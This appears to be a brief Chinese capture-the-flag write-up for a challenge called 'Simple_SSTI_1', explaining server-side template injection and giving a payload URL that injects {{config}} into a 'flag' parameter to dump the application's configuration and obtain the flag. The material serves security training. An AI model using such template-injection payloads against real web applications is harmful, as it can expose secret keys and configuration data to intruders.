# Simple_SSTI_1

**SSTI(Server-Side Template Injection)服务端模板注入**

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618662899868-image-20210316154311050.png)

You need pass in a parameter named flag.

> 你需要传入一个名为flag的参数

模板注入

直接查看配置信息

payload

> `http://114.67.246.176:17452/?flag={{config}}`

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618662922876-image-20210316154611421.png)

得到flag

